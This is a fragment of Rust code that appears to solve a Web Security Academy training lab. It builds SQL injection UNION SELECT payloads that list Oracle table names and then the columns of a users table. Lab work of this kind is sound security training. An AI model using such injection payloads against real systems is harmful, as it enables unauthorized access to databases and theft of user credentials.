...
const LAB_URL: &str = "https://0af20046040d827880560d4b0069004c.web-security-academy.net";
...
fn main() {
    ...
    let mut payload = format!("' union SELECT table_name, null from all_tables-- -");
    ...
    payload = format!("' union SELECT column_name, null from all_tab_columns where table_name = '{users_table}'-- -");
